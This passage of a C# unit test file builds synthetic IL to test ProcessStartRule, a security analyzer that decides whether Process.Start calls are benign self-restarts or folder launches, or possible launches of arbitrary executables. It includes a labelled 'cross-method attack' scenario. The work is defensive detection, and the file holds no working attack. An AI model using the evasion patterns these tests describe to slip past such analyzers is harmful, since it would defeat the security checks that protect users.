        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        var loopStart = Instruction.Create(OpCodes.Ldloc, startInfo);
        il.Append(loopStart);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Ldloc, startInfo);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Br, loopStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void RestartAnalysisBudget_ManyStartsAndCompetingWrites_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        for (int i = 0; i < 64; i++)
            il.Emit(OpCodes.Callvirt, setFileName);
        for (int i = 0; i < 64; i++)
            il.Emit(OpCodes.Call, processStart);

        ProcessStartRule.IsRestartAnalysisWithinBudget(method.Body.Instructions).Should().BeFalse();
    }

    [Fact]
    public void ExplorerAnalysisBudget_ManyLocalBackedStarts_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var target = new VariableDefinition(stringType);
        method.Body.Variables.Add(target);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        for (int i = 0; i < 2_048; i++)
        {
            il.Emit(OpCodes.Ldloc, target);
            il.Emit(OpCodes.Call, processStart);
        }

        ProcessStartRule.IsExplorerAnalysisWithinBudget(method.Body.Instructions).Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_StaticFieldBackedRestart_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var field = new FieldReference("RestartPath", stringType,
            new TypeReference("Test", "State", null, null));
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stsfld, field);
        il.Emit(OpCodes.Ldsfld, field);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_FieldBackedRestartAcrossMutatingCall_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stateType = new TypeReference("Test", "State", null, null);
        var field = new FieldReference("RestartPath", stringType, stateType);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stsfld, field);
        il.Emit(OpCodes.Call, new MethodReference("ChangeRestartPath", method.ReturnType, stateType));
        il.Emit(OpCodes.Ldsfld, field);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_FieldBackedRestartAcrossThrowingMutatingCall_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var stateType = new TypeReference("Test", "State", null, null);
        var field = new FieldReference("RestartPath", stringType, stateType);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stsfld, field);
        var tryStart = Instruction.Create(OpCodes.Call,
            new MethodReference("ChangeRestartPathAndThrow", method.ReturnType, stateType));
        var handlerStart = Instruction.Create(OpCodes.Pop);
        var afterHandler = Instruction.Create(OpCodes.Ret);
        il.Append(tryStart);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(handlerStart);
        il.Emit(OpCodes.Ldsfld, field);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);
        il.Emit(OpCodes.Leave, afterHandler);
        il.Append(afterHandler);
        method.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
        {
            TryStart = tryStart,
            TryEnd = handlerStart,
            HandlerStart = handlerStart,
            HandlerEnd = afterHandler,
            CatchType = new TypeReference("System", "Exception", null, null)
        });

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch),
            new MethodSignals { ExceptionHandlers = method.Body.ExceptionHandlers.ToArray() });

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_InstanceFieldBackedRestart_ReturnsTrue()
    {
        var declaringType = new TypeReference("Test", "State", null, null);
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public,
            new TypeReference("System", "Void", null, null));
        method.DeclaringType = new TypeDefinition("Test", "State", TypeAttributes.Public, null);
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var field = new FieldReference("RestartPath", stringType, declaringType);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stfld, field);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Ldfld, field);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_EquivalentRestartDefinitionsAcrossBranch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var target = new VariableDefinition(stringType);
        method.Body.Variables.Add(target);
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var falseBranch = Instruction.Create(OpCodes.Call,
            new MethodReference("GetCurrentProcess", processType, processType));
        var launchTarget = Instruction.Create(OpCodes.Ldloc, target);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse, falseBranch);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, target);
        il.Emit(OpCodes.Br, launchTarget);
        il.Append(falseBranch);
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Stloc, target);
        il.Append(launchTarget);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_EquivalentCurrentProcessStackValuesAcrossBranch_ReturnsTrue()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true };
        var getFileName = new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true };
        var processStart = CreateProcessStart(stringType);
        var il = method.Body.GetILProcessor();
        var falseBranch = Instruction.Create(OpCodes.Call, getCurrentProcess);
        var launch = Instruction.Create(OpCodes.Call, processStart);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse, falseBranch);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Emit(OpCodes.Br, launch);
        il.Append(falseBranch);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        il.Append(launch);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.IndexOf(launch), new MethodSignals());

        result.Should().BeTrue();
    }

    [Fact]
    public void ShouldSuppressFinding_ConditionalAliasOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var launched = new VariableDefinition(startInfoType);
        var other = new VariableDefinition(startInfoType);
        var alias = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(launched);
        method.Body.Variables.Add(other);
        method.Body.Variables.Add(alias);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, launched);
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, other);
        il.Emit(OpCodes.Ldloc, launched);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, other);
        il.Emit(OpCodes.Stloc, alias);
        il.Emit(OpCodes.Ldarg_0);
        var useAlias = Instruction.Create(OpCodes.Ldloc, alias);
        il.Emit(OpCodes.Brfalse, useAlias);
        il.Emit(OpCodes.Ldloc, launched);
        il.Emit(OpCodes.Stloc, alias);
        il.Append(useAlias);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, launched);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_LowerIndexLoopOverwrite_ReturnsFalse()
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        method.Parameters.Add(new ParameterDefinition(new TypeReference("System", "Boolean", null, null)));
        var stringType = new TypeReference("System", "String", null, null);
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processModuleType = new TypeReference("System.Diagnostics", "ProcessModule", null, null);
        var startInfo = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(startInfo);
        var constructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var processStart = CreateProcessStart(startInfoType);
        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, constructor);
        il.Emit(OpCodes.Stloc, startInfo);
        var safeAssignment = Instruction.Create(OpCodes.Ldloc, startInfo);
        il.Emit(OpCodes.Br, safeAssignment);
        var competingAssignment = Instruction.Create(OpCodes.Ldloc, startInfo);
        il.Append(competingAssignment);
        il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        il.Emit(OpCodes.Callvirt, setFileName);
        var launch = Instruction.Create(OpCodes.Ldloc, startInfo);
        il.Emit(OpCodes.Br, launch);
        il.Append(safeAssignment);
        il.Emit(OpCodes.Call, new MethodReference("GetCurrentProcess", processType, processType));
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_MainModule", processModuleType, processType) { HasThis = true });
        il.Emit(OpCodes.Callvirt,
            new MethodReference("get_FileName", stringType, processModuleType) { HasThis = true });
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brtrue, competingAssignment);
        il.Append(launch);
        il.Emit(OpCodes.Call, processStart);

        var result = _rule.ShouldSuppressFinding(processStart, method.Body.Instructions,
            method.Body.Instructions.Count - 1, new MethodSignals());

        result.Should().BeFalse();
    }

    [Fact]
    public void ShouldSuppressFinding_CrossMethodFileWrite_ReturnsFalse()
    {
        // SECURITY TEST: Cross-method attack
        // Attacker writes file in MethodA, executes in MethodB
        // We should detect this via type-level signals
        var method = new MethodDefinition("Execute", MethodAttributes.Public, new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();

        processor.Emit(OpCodes.Ldstr, "explorer.exe");
        processor.Emit(OpCodes.Call, new MethodReference("Start", new TypeReference("", "Process", null, null), new TypeReference("System.Diagnostics", "Process", null, null)));

        var instructions = method.Body.Instructions;
        var callIndex = instructions.Count - 1;

        // This method has no file writes, but type-level signals show file writes in other methods
        var methodSignals = new MethodSignals { HasFileWrite = false };
        var typeSignals = new MethodSignals { HasFileWrite = true }; // File written in different method

        // Act
        var result = _rule.ShouldSuppressFinding(null!, instructions, callIndex, methodSignals, typeSignals);

        // Assert - Should NOT suppress because type has file writes (cross-method attack)
        result.Should().BeFalse("Process.Start should NOT be suppressed when type has file writes in other methods");
    }

    private static MethodReference CreateProcessStart(params TypeReference[] parameterTypes)
    {
        var processStart = new MethodReference(
            "Start",
            new TypeReference("System.Diagnostics", "Process", null, null),
            new TypeReference("System.Diagnostics", "Process", null, null));
        foreach (var parameterType in parameterTypes)
        {
            processStart.Parameters.Add(new ParameterDefinition(parameterType));
        }

        return processStart;
    }

    private static (MethodReference ProcessStart, InstructionCollection Instructions, int ProcessStartIndex)
        BuildProcessStartInfoRestartScenario(bool useRestartTarget)
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("System", "Void", null, null));
        var processType = new TypeReference("System.Diagnostics", "Process", null, null);
        var startInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var processLocal = new VariableDefinition(processType);
        var startInfoLocal = new VariableDefinition(startInfoType);
        method.Body.Variables.Add(processLocal);
        method.Body.Variables.Add(startInfoLocal);

        var processConstructor = new MethodReference(".ctor", method.ReturnType, processType) { HasThis = true };
        var startInfoConstructor = new MethodReference(".ctor", method.ReturnType, startInfoType) { HasThis = true };
        var getCurrentProcess = new MethodReference("GetCurrentProcess", processType, processType);
        var getMainModule = new MethodReference("get_MainModule",
            new TypeReference("System.Diagnostics", "ProcessModule", null, null), processType)
        { HasThis = true };
        var getFileName = new MethodReference("get_FileName",
            new TypeReference("System", "String", null, null), getMainModule.ReturnType)
        { HasThis = true };
        var setFileName = new MethodReference("set_FileName", method.ReturnType, startInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(getFileName.ReturnType));
        var setStartInfo = new MethodReference("set_StartInfo", method.ReturnType, processType) { HasThis = true };
        setStartInfo.Parameters.Add(new ParameterDefinition(startInfoType));
        var processStart = new MethodReference("Start", new TypeReference("System", "Boolean", null, null),
            processType)
        { HasThis = true };

        var il = method.Body.GetILProcessor();
        il.Emit(OpCodes.Newobj, processConstructor);
        il.Emit(OpCodes.Stloc, processLocal);
        il.Emit(OpCodes.Newobj, startInfoConstructor);
        il.Emit(OpCodes.Stloc, startInfoLocal);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Call, getCurrentProcess);
        il.Emit(OpCodes.Callvirt, getMainModule);
        il.Emit(OpCodes.Callvirt, getFileName);
        if (!useRestartTarget)
        {
            il.Emit(OpCodes.Pop);
            il.Emit(OpCodes.Ldstr, "arbitrary.exe");
        }
        il.Emit(OpCodes.Callvirt, setFileName);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Ldloc, startInfoLocal);
        il.Emit(OpCodes.Callvirt, setStartInfo);
        il.Emit(OpCodes.Ldloc, processLocal);
        il.Emit(OpCodes.Callvirt, processStart);

        return (processStart, method.Body.Instructions, method.Body.Instructions.Count - 1);
    }

    private static (MethodReference ProcessStart, InstructionCollection Instructions, int ProcessStartIndex)
        BuildShellFolderLaunchScenario(
            string directoryTarget,
            string fileNameTarget,
            bool useDirectoryExists = false,
            bool useParameterTarget = false,
            bool reassignParameter = false,
            bool earlyReturnExists = false)
    {
        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
            new TypeReference("", "Void", null, null));
        var processor = method.Body.GetILProcessor();
        var stringType = new TypeReference("System", "String", null, null);
        var boolType = new TypeReference("System", "Boolean", null, null);
        var voidType = new TypeReference("System", "Void", null, null);
        var processStartInfoType = new TypeReference("System.Diagnostics", "ProcessStartInfo", null, null);
        var startInfoLocal = new VariableDefinition(processStartInfoType);
        method.Body.Variables.Add(startInfoLocal);
        ParameterDefinition? pathParameter = null;
        if (useParameterTarget)
        {
            pathParameter = new ParameterDefinition(stringType);
            method.Parameters.Add(pathParameter);
        }

        var directoryMethod = new MethodReference(
            useDirectoryExists ? "Exists" : "CreateDirectory",
            useDirectoryExists ? boolType : new TypeReference("System.IO", "DirectoryInfo", null, null),
            new TypeReference("System.IO", "Directory", null, null));
        directoryMethod.Parameters.Add(new ParameterDefinition(stringType));
        var constructor = new MethodReference(".ctor", voidType, processStartInfoType) { HasThis = true };
        var setFileName = new MethodReference("set_FileName", voidType, processStartInfoType) { HasThis = true };
        setFileName.Parameters.Add(new ParameterDefinition(stringType));
        var setUseShellExecute = new MethodReference("set_UseShellExecute", voidType, processStartInfoType)
        {
            HasThis = true
        };
        setUseShellExecute.Parameters.Add(new ParameterDefinition(boolType));
        var processStart = new MethodReference("Start", new TypeReference("System.Diagnostics", "Process", null, null),
            new TypeReference("System.Diagnostics", "Process", null, null));
        processStart.Parameters.Add(new ParameterDefinition(processStartInfoType));

        if (useParameterTarget)
            processor.Emit(OpCodes.Ldarg, pathParameter!);
        else
            processor.Emit(OpCodes.Ldstr, directoryTarget);
        processor.Emit(OpCodes.Call, directoryMethod);
        Instruction? guardedLaunch = null;
        if (useDirectoryExists && earlyReturnExists)
        {
            guardedLaunch = Instruction.Create(OpCodes.Nop);
            processor.Emit(OpCodes.Brtrue, guardedLaunch);
            processor.Emit(OpCodes.Ret);
            processor.Append(guardedLaunch);
        }
        else
        {
            processor.Emit(OpCodes.Pop);
        }

        if (reassignParameter)
        {
            processor.Emit(OpCodes.Ldstr, fileNameTarget);
            processor.Emit(OpCodes.Starg, pathParameter!);
        }

        processor.Emit(OpCodes.Newobj, constructor);
        processor.Emit(OpCodes.Stloc, startInfoLocal);
        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        if (useParameterTarget)
            processor.Emit(OpCodes.Ldarg, pathParameter!);
        else
            processor.Emit(OpCodes.Ldstr, fileNameTarget);
        processor.Emit(OpCodes.Callvirt, setFileName);
        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        processor.Emit(OpCodes.Ldc_I4_1);
        processor.Emit(OpCodes.Callvirt, setUseShellExecute);
        processor.Emit(OpCodes.Ldloc, startInfoLocal);
        processor.Emit(OpCodes.Call, processStart);

        return (processStart, method.Body.Instructions, method.Body.Instructions.Count - 1);
    }

    #endregion
}
